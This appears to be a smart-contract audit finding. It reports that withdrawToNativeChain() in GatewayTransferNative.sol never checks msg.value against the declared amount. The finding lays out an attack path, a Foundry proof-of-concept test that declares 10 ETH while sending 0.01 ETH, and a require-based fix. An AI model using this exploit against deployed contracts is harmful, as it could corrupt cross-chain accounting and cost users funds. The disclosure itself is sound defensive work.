# Incorrect ETH Accounting Due to Unchecked `msg.value` in `withdrawToNativeChain()`

## Summary

A missing validation check between `msg.value` and the `amount` parameter will cause inconsistencies and potentially underfunded transactions for the protocol. A malicious user can underreport or overreport their ETH transfer in `withdrawToNativeChain()`.

## Root Cause

In `GatewayTransferNative.sol`, the `withdrawToNativeChain()` function does not verify that `msg.value == amount`.

This allows users to submit mismatched values, resulting in incorrect internal accounting, fee calculations, or execution behavior during the cross-chain transfer process.

## Internal Pre-conditions

- User calls `withdrawToNativeChain()` with `zrc20 == _ETH_ADDRESS_`
- User passes any arbitrary `amount`, e.g., 10 ETH
- User sends a different `msg.value`, e.g., 1 wei or 0 ETH

## External Pre-conditions

- No off-chain enforcement or validation ties `msg.value` to `amount` during the transaction.
- The DoDo router expects the ETH amount to be consistent with what the contract provides as swap input.

## Attack Path

1. The attacker calls `withdrawToNativeChain()` with `zrc20 = _ETH_ADDRESS_`.
2. Skips the `transferFrom()` since ETH does not require approval.
3. Sets `amount = 100 ETH` but sends `msg.value = 0.01 ETH`.
4. The `_handleFeeTransfer()` computes 0.5% of `amount` (i.e., 0.5 ETH) and attempts to transfer from ETH (which fails or behaves inconsistently).
5. The DoDo swap is executed with only `0.01 ETH` via `msg.value`, not the declared `amount`, breaking swap assumptions and logic.
6. Events log a fake transfer of `100 ETH`, creating false accounting on destination chains.

## Impact

- The protocol incorrectly processes ETH swaps and withdrawals.
- Platform fee calculations are based on a fake `amount`, even though no actual ETH was sent.
- This may lead to underpayment, griefing, or failed user swaps.
- Potential for unaccounted swap calls via DoDo router with `msg.value = 0` while misrepresenting as large value swaps.
- Affects user trust, system correctness, and could be used in griefing attacks or to drain liquidity pools if used in coordination with routing exploits.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/GatewayTransferNative.sol"; // Replace with actual import

contract ExploitTest is Test {
    GatewayTransferNative public gateway;
    address payable attacker = payable(address(0xBEEF));
    address ETH_ADDRESS = address(0x0); // Simulated ETH ZRC20 address
    bytes fakeMessage;

    function setUp() public {
        gateway = new GatewayTransferNative();
        vm.deal(attacker, 100 ether); // Fund attacker
    }

    function testExploit_MsgValueMismatch() public {
        vm.startPrank(attacker);

        // Fake message with minimal valid data
        fakeMessage = abi.encodePacked(uint256(999)); // Simulated receiver chain ID

        // Attacker pretends to send 10 ETH but only sends 0.01 ETH
        gateway.withdrawToNativeChain{value: 0.01 ether}(
            ETH_ADDRESS,
            10 ether, // Declared amount (fake)
            fakeMessage
        );

        vm.stopPrank();

        // Assert: logs will reflect 10 ETH; only 0.01 ETH actually sent
        // Swap, fee, and accounting now misaligned.
    }
}
```

## Mitigation

Add a check in the beginning of `withdrawToNativeChain()`:

```solidity
if (zrc20 == _ETH_ADDRESS_) {
    require(msg.value == amount, "msg.value mismatch");
}
```

This ensures that the actual ETH sent matches the declared transfer `amount`, preventing misrepresentation and protecting fee calculations and swap logic.
